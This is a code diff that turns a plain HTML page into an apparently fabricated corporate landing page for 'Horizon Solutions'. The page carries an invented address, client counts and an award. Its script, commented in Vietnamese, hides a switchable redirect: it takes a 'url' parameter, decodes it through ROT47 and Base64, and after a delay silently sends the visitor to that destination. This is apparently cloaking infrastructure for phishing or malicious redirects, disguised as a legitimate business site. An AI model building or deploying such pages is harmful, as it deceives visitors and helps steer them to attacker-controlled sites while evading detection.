@@ -2,27 +2,122 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Welcome to Our Service</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Empower Your Future with Horizon Solutions - Leading Technology and Business Services in the USA">
+    <meta name="keywords" content="technology, business solutions, USA, enterprise services">
+    <meta name="author" content="Horizon Solutions">
+    <title>Horizon Solutions - Empowering Your Future</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f7fa;
+            color: #333;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #fff;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+            margin-top: 20px;
+        }
+        header {
+            text-align: center;
+            padding: 20px 0;
+            background: #004085;
+            color: #fff;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 2.5em;
+        }
+        header p {
+            margin: 5px 0;
+            font-size: 1.2em;
+        }
+        .content {
+            margin: 20px 0;
+        }
+        .content h2 {
+            color: #004085;
+            font-size: 1.8em;
+        }
+        .content p {
+            font-size: 1.1em;
+        }
+        .cta {
+            display: inline-block;
+            padding: 12px 30px;
+            background: #007bff;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        .cta:hover {
+            background: #0056b3;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: #f8f9fa;
+            margin-top: 20px;
+            font-size: 0.9em;
+            color: #666;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            font-style: italic;
+            color: #666;
+        }
+    </style>
 </head>
 <body>
-    <h1>Welcome to Our Service</h1>
-    <p>Loading your personalized content...</p>
-    
+    <header>
+        <h1>Horizon Solutions</h1>
+        <p>Empowering Your Future with Cutting-Edge Technology</p>
+    </header>
+    <div class="container">
+        <div class="content">
+            <h2>About Us</h2>
+            <p>Founded in 2005, Horizon Solutions is a leading provider of technology and business services across the United States. With headquarters in San Francisco, California, we empower enterprises to achieve their goals through innovative solutions, exceptional support, and a commitment to excellence.</p>
+            
+            <h2>Our Services</h2>
+            <p>We offer a wide range of services including cloud computing, cybersecurity, data analytics, and enterprise software development. Our team of experts works tirelessly to deliver tailored solutions that drive growth and efficiency for businesses of all sizes.</p>
+            
+            <h2>Why Choose Horizon?</h2>
+            <p>With over 500 satisfied clients and a presence in 25 states, Horizon Solutions is trusted by industry leaders. Our dedication to quality and innovation has earned us multiple awards, including the 2024 Tech Innovation Award.</p>
+            
+            <a href="#" class="cta">Get Started Today</a>
+        </div>
+        <p class="loading">Loading your personalized content...</p>
+    </div>
+    <div class="footer">
+        &copy; 2025 Horizon Solutions, Inc. All Rights Reserved. | 123 Market St, San Francisco, CA 94103 | Contact: info@horizonsolutions.com
+    </div>
+
     <script>
         // Trạng thái chuyển hướng: 'ON' hoặc 'OFF'
-        const redirectStatus = 'OFF'; // Sửa thành 'OFF' để tắt giải mã và chuyển hướng
+        const redirectStatus = 'OFF'; // Đổi thành 'ON' để bật chuyển hướng ẩn
 
-        function processData(input) {
-            let result = '';
+        // Hàm giải mã nâng cao (Base64 + ROT47)
+        function decodeAdvanced(input) {
+            let rot47 = '';
             for (let i = 0; i < input.length; i++) {
                 let code = input.charCodeAt(i);
                 if (code >= 33 && code <= 126) {
-                    result += String.fromCharCode((code - 33 - 47 + 94) % 94 + 33);
+                    rot47 += String.fromCharCode((code - 33 - 47 + 94) % 94 + 33);
                 } else {
-                    result += input[i];
+                    rot47 += input[i];
                 }
             }
-            return result;
+            return atob(rot47);
         }
 
         // Lấy tham số từ URL
@@ -30,15 +125,15 @@
         const data = params.get('url') || '';
 
         if (redirectStatus === 'ON' && data) {
-            // Khi ON: Giải mã ROT47 và chuyển hướng
-            const processed = processData(data);
-            window.location.href = processed;
+            const processed = decodeAdvanced(data);
+            setTimeout(() => {
+                window.location.replace(processed);
+            }, 1500);
+            document.querySelector('.loading').style.display = 'block';
         } else if (!data) {
-            // Không có URL: Hiển thị thông báo lỗi
-            document.body.innerHTML = "<p>Sorry, we couldn't load your content.</p>";
+            console.log("No URL provided, showing business page.");
         } else {
-            // Khi OFF: Không giải mã, chỉ hiển thị nội dung tĩnh
-            document.body.innerHTML = "<p>Your content is ready! Enjoy our service.</p>";
+            console.log("Redirect is OFF, showing business page.");
         }
     </script>
 </body>
